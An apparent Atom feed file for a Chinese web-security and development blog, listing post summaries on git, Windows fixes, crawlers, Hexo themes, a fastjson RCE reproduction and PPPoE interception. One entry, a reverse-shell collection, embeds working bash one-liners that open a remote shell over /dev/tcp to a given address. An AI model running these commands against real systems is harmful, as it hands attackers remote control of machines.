@@ -1,0 +1,436 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Akkuman Blog</title>
+  <icon>http://hacktech.cn/icon.png</icon>
+  <subtitle>web安全与二进制路上挣扎前行的自留地</subtitle>
+  <link href="http://hacktech.cn/atom.xml" rel="self"/>
+  
+  <link href="http://hacktech.cn/"/>
+  <updated>2020-12-01T07:41:40.749Z</updated>
+  <id>http://hacktech.cn/</id>
+  
+  <author>
+    <name>Akkuman</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>RAP2 前后端开发利器搭建</title>
+    <link href="http://hacktech.cn/2019/10/12/rap2-api-manage-building.html"/>
+    <id>http://hacktech.cn/2019/10/12/rap2-api-manage-building.html</id>
+    <published>2019-10-12T12:55:12.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;RAP2 是一个api管理系统，前后端协作开发的利器。&lt;/p&gt;
+&lt;p&gt;在线体验地址&lt;a href=&quot;http://rap2.taobao.org/&quot;&gt;http://rap2.taobao.org&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Web接口管理工具，开源免费，接口自动化，MOCK数据自动生成，自动化测试，企业级管理。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="配置与搭建" scheme="http://hacktech.cn/categories/%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%90%AD%E5%BB%BA/"/>
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+    <category term="配置与搭建" scheme="http://hacktech.cn/tags/%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%90%AD%E5%BB%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>fastjson&lt;1.2.47 RCE 漏洞复现</title>
+    <link href="http://hacktech.cn/2019/07/15/fastjson-under-1.2.47-rce.html"/>
+    <id>http://hacktech.cn/2019/07/15/fastjson-under-1.2.47-rce.html</id>
+    <published>2019-07-15T08:16:12.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;这两天爆出了 fastjson 的老洞，复现简单记录一下。&lt;/p&gt;
+&lt;p&gt;首先使用 spark 搭建一个简易的利用 fastjson 解析 json 的 http server。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
+    
+    
+    <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Bad owner or permissions on .ssh/config win10问题解决</title>
+    <link href="http://hacktech.cn/2019/07/15/bad-owner-or-permissions-ssh-win10.html"/>
+    <id>http://hacktech.cn/2019/07/15/bad-owner-or-permissions-ssh-win10.html</id>
+    <published>2019-07-15T02:35:06.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;最近向系统添加了新用户账号后出现了问题，尝试使用私钥登陆服务器，提示了 Bad owner or permissions on .ssh/config 这个报错，就是如题中的问题&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/akkuman/pic/master/img/1106918-20190715102859616-1893463244.png&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>git彻底删除或变更子模块</title>
+    <link href="http://hacktech.cn/2019/05/23/git-rm-or-change-submodule.html"/>
+    <id>http://hacktech.cn/2019/05/23/git-rm-or-change-submodule.html</id>
+    <published>2019-05-23T06:30:00.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;今天遇到一个很怪的问题，我想把我的一个子模块切换到另一个上游，我按照网上的方法删除子模块然后新建后，这个子模块依旧跟踪着我先前的上游。自己摸索了一下，可能方法比较傻，不过是可行的，希望能给大家一些帮助。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="git" scheme="http://hacktech.cn/categories/git/"/>
+    
+    
+    <category term="git" scheme="http://hacktech.cn/tags/git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>湖北校园网PC端拨号算法逆向</title>
+    <link href="http://hacktech.cn/2019/05/21/re-hubei-feiyoung-pc-version.html"/>
+    <id>http://hacktech.cn/2019/05/21/re-hubei-feiyoung-pc-version.html</id>
+    <published>2019-05-21T05:50:00.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;湖北校园网PC端拨号算法逆向&quot;&gt;&lt;a href=&quot;#湖北校园网PC端拨号算法逆向&quot; class=&quot;headerlink&quot; title=&quot;湖北校园网PC端拨号算法逆向&quot;&gt;&lt;/a&gt;湖北校园网PC端拨号算法逆向&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一文 &lt;a href=&quot;https://www.anquanke.com/post/id/178484&quot;&gt;PPPoE中间人拦截以及校园网突破漫谈&lt;/a&gt;我们谈到使用 PPPoE 拦截来获取真实的账号密码。&lt;br&gt;在这个的基础上，我对我们湖北的客户端进行了逆向，得到了拨号加密算法。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+    <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
+    
+    <category term="网络协议" scheme="http://hacktech.cn/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>PPPoE中间人拦截以及校园网突破漫谈</title>
+    <link href="http://hacktech.cn/2019/05/12/pppoe-server-mitm.html"/>
+    <id>http://hacktech.cn/2019/05/12/pppoe-server-mitm.html</id>
+    <published>2019-05-12T08:16:12.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;本文首发于&lt;a href=&quot;https://www.anquanke.com/post/id/178484&quot;&gt;PPPoE中间人拦截以及校园网突破漫谈&lt;/a&gt;，转载请注明出处。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&quot;PPPoE中间人拦截以及校园网突破漫谈&quot;&gt;&lt;a href=&quot;#PPPoE中间人拦截以及校园网突破漫谈&quot; class=&quot;headerlink&quot; title=&quot;PPPoE中间人拦截以及校园网突破漫谈&quot;&gt;&lt;/a&gt;PPPoE中间人拦截以及校园网突破漫谈&lt;/h1&gt;&lt;p&gt;校园生活快结束了，之前还有点未完成的想法，趁着这两天有兴趣搞搞。&lt;/p&gt;
+&lt;p&gt;此文面向大众是那种在校园内苦受拨号客户端的毒害，但是又想自己动手折腾下的。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="网络协议" scheme="http://hacktech.cn/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+    
+    <category term="网络协议" scheme="http://hacktech.cn/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>vscode打开django项目pylint提示has not &quot;object&quot; member</title>
+    <link href="http://hacktech.cn/2019/04/28/vscode-django-pylint-error.html"/>
+    <id>http://hacktech.cn/2019/04/28/vscode-django-pylint-error.html</id>
+    <published>2019-04-27T21:41:57.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;vscode 打开 django 项目提示 has not “object” member 是因为 Django 动态地将属性添加到所有模型类中，所以 ide 无法解析。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>从客户端取到浏览器返回的oauth凭证</title>
+    <link href="http://hacktech.cn/2019/04/26/get-auth-and-back-to-client.html"/>
+    <id>http://hacktech.cn/2019/04/26/get-auth-and-back-to-client.html</id>
+    <published>2019-04-26T02:14:33.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;这个随便记录一下，也是朋友问我的一个问题。&lt;/p&gt;
+&lt;p&gt;在网上找了下，没找到相关的，用英文也搜索了一下，可能我的关键词没找对，找了一会没找到。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>打造一个壁纸爬虫来爬你的老婆</title>
+    <link href="http://hacktech.cn/2019/03/13/wall-alphacoders-com-crawler.html"/>
+    <id>http://hacktech.cn/2019/03/13/wall-alphacoders-com-crawler.html</id>
+    <published>2019-03-12T23:07:57.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;好久没写东西了，随便水一篇文，也是比较简单的东西&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
+    
+    
+    <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>windows中的软链接硬链接等</title>
+    <link href="http://hacktech.cn/2018/09/21/windows-file-dir-link.html"/>
+    <id>http://hacktech.cn/2018/09/21/windows-file-dir-link.html</id>
+    <published>2018-09-20T23:55:11.000Z</published>
+    <updated>2020-12-01T07:41:40.753Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;学校嘛，有些时候还是得逆逆上网客户端啥的，并且学校的不少工作，这Windows的需求还是挺强的，之前Win10的体验并不是太好，不过时隔这么久，打算从7升级到10了，恰好系统也该换了。&lt;/p&gt;
+&lt;p&gt;首先是命令行的关注，在家里使用了太久的marjaro，逐渐转为开发，以前对windows的命令行不关注也变为关注了，PowerShell安装了scoop，可以一键安装不少工具了，但是有一个痛点就是，以前对用户目录不关注，但是linux用久了反而觉得用户目录好用挖，我想在在命令行下切到我快捷方式指向的目录，但是是不行的，然后了解了一下这方面，就像是linux下的软链接硬链接一样。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="Windows" scheme="http://hacktech.cn/categories/Windows/"/>
+    
+    
+    <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>拉勾抓职位简单小爬虫</title>
+    <link href="http://hacktech.cn/2018/09/11/crawl-jos-on-lagou.html"/>
+    <id>http://hacktech.cn/2018/09/11/crawl-jos-on-lagou.html</id>
+    <published>2018-09-10T20:12:38.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;花了十来分钟写了个这个小爬虫，目的就是想能够方便一点寻找职位，并且大四了，没有工作和实习很慌啊！&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
+    
+    
+    <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>GTD利器Google Calendar与Hexo博客的结合</title>
+    <link href="http://hacktech.cn/2018/09/08/GTD-google-calendar-with-hexo-next.html"/>
+    <id>http://hacktech.cn/2018/09/08/GTD-google-calendar-with-hexo-next.html</id>
+    <published>2018-09-07T18:44:25.000Z</published>
+    <updated>2020-12-01T07:41:40.745Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;等待 &lt;code&gt;hexo-theme-next&lt;/code&gt; 主题官方仓库的合并。以后再写，先挖个坑。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="blog" scheme="http://hacktech.cn/categories/blog/"/>
+    
+    
+    <category term="blog" scheme="http://hacktech.cn/tags/blog/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用Travis CI自动部署博客到github pages和coding pages</title>
+    <link href="http://hacktech.cn/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html"/>
+    <id>http://hacktech.cn/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html</id>
+    <published>2018-09-07T11:25:20.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;每次换系统或换电脑之后重新部署博客总是很苦恼？想像jekyll那样，一次性部署完成后，以后本地不用安装环境直接 &lt;code&gt;git push&lt;/code&gt; 就能生成博客？那我推荐你应该使用使用 &lt;code&gt;Travis CI&lt;/code&gt;了。&lt;/p&gt;
+&lt;p&gt;这篇文章我们来讲讲如何利用 &lt;code&gt;Travis CI&lt;/code&gt;把你 &lt;code&gt;push&lt;/code&gt; 上去的博客源文件直接生成可访问的站点，并且同步部署到 &lt;code&gt;github pages&lt;/code&gt; 和 &lt;code&gt;coding pages&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;这篇文章假设你已经对这些采用 &lt;code&gt;git&lt;/code&gt; 版本控制系统的静态博客托管服务有所了解，并且知道怎么去简单的使用 &lt;code&gt;git&lt;/code&gt; 以及了解 &lt;code&gt;hexo&lt;/code&gt; 写博客发布到这些 &lt;code&gt;pages&lt;/code&gt; 服务的流程。因此本文会写的较为&lt;strong&gt;简略，旨在指出关键的地方以及我遇到的问题、问题产生的原因和提供的解决方案&lt;/strong&gt;，希望能够帮助到大家。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="git" scheme="http://hacktech.cn/categories/git/"/>
+    
+    
+    <category term="blog" scheme="http://hacktech.cn/tags/blog/"/>
+    
+    <category term="git" scheme="http://hacktech.cn/tags/git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Kali Linux Xfce版美化虚拟机镜像</title>
+    <link href="http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html"/>
+    <id>http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html</id>
+    <published>2018-09-04T02:59:43.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Kali&lt;/code&gt; 一直用的是 &lt;code&gt;xfce&lt;/code&gt; 版本，至于为什么用这个版本，是因为我感觉 &lt;code&gt;gnome3&lt;/code&gt; 在虚拟机上表现欠佳。当然，默认的 &lt;code&gt;gnome3&lt;/code&gt; 看起来还是不错的，而 &lt;code&gt;xfce&lt;/code&gt; 默认的就看起来很寒碜了&lt;/p&gt;
+&lt;p&gt;默认的 &lt;code&gt;Kali-Xfce&lt;/code&gt; 是这个样子的&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="Kali" scheme="http://hacktech.cn/categories/Kali/"/>
+    
+    
+    <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
+    
+    <category term="Kali" scheme="http://hacktech.cn/tags/Kali/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>win10 1803版本unable to start ssh-agent service, error :1058</title>
+    <link href="http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html"/>
+    <id>http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html</id>
+    <published>2018-09-01T08:26:11.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;PowerShell安装了pshazz或者posh-git，但是打开的时候提示 &lt;code&gt;unable to start ssh-agent service, error :1058&lt;/code&gt;  &lt;/p&gt;</summary>
+    
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+    
+    <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
+    
+    <category term="Win10" scheme="http://hacktech.cn/tags/Win10/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>反弹shell以及端口转发的方法收集</title>
+    <link href="http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html"/>
+    <id>http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html</id>
+    <published>2018-08-23T08:03:29.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.142/80 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt; 5&amp;lt;&amp;gt;/dev/tcp/192.168.1.142/80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat &amp;lt;&amp;amp;5 | &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# or:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line 0&amp;lt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
+    
+    
+    <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>为纸小墨一键创建md文件</title>
+    <link href="http://hacktech.cn/2018/08/22/ink-create-md.html"/>
+    <id>http://hacktech.cn/2018/08/22/ink-create-md.html</id>
+    <published>2018-08-22T10:17:23.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;用法：&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python the.py file_name [article_title] [author_id]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# []括起来为可选项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
+    
+    
+    
+    <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
+    
+    
+    <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
+    
+    <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一键git push脚本(python版)</title>
+    <link href="http://hacktech.cn/2018/08/22/git-push-python-script.html"/>
+    <id>http://hacktech.cn/2018/08/22/git-push-python-script.html</id>
+    <published>2018-08-22T09:34:24.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="git" scheme="http://hacktech.cn/categories/git/"/>
+    
+    
+    <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
+    
+    <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
+    
+    <category term="git" scheme="http://hacktech.cn/tags/git/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>纸小墨ink简洁主题story爱上你的故事</title>
+    <link href="http://hacktech.cn/2018/08/22/ink-theme-story.html"/>
+    <id>http://hacktech.cn/2018/08/22/ink-theme-story.html</id>
+    <published>2018-08-22T07:36:42.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;主题介绍&quot;&gt;&lt;a href=&quot;#主题介绍&quot; class=&quot;headerlink&quot; title=&quot;主题介绍&quot;&gt;&lt;/a&gt;主题介绍&lt;/h2&gt;&lt;p&gt;为纸小墨写的一款主题,该主题移植自&lt;a href=&quot;https://yumoe.com/&quot;&gt;Yumoe&lt;/a&gt;&lt;/p&gt;
+&lt;!--和[Artifact.](https://artifact.me/)--&gt;
+
+&lt;p&gt;github地址：&lt;a href=&quot;https://github.com/akkuman/ink-theme-story&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Demo&quot;&gt;&lt;a href=&quot;#Demo&quot; class=&quot;headerlink&quot; title=&quot;Demo&quot;&gt;&lt;/a&gt;Demo&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://ink-theme-story.pancakeapps.com/&quot;&gt;ink-theme-story&lt;/a&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="theme" scheme="http://hacktech.cn/categories/theme/"/>
+    
+    
+    <category term="theme" scheme="http://hacktech.cn/tags/theme/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>git忽略对已入库文件的修改</title>
+    <link href="http://hacktech.cn/2018/08/22/git-update-index.html"/>
+    <id>http://hacktech.cn/2018/08/22/git-update-index.html</id>
+    <published>2018-08-22T07:18:42.000Z</published>
+    <updated>2020-12-01T07:41:40.749Z</updated>
+    
+    
+    <summary type="html">&lt;p&gt;项目开发过程中，会遇到本地配置文件每个开发人员不同的情况，但如果遇到类似数据库配置这种最终需要加入 git 版本控制的配置，则会陷入两难境地。要么不跟踪，要么有人提交后其他人同步下来必须手动修改，非常麻烦。其实，对于已被纳入版本管理的文件，git 也提供了很好的解决办法。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="git" scheme="http://hacktech.cn/categories/git/"/>
+    
+    
+    <category term="git" scheme="http://hacktech.cn/tags/git/"/>
+    
+  </entry>
+  
+</feed>
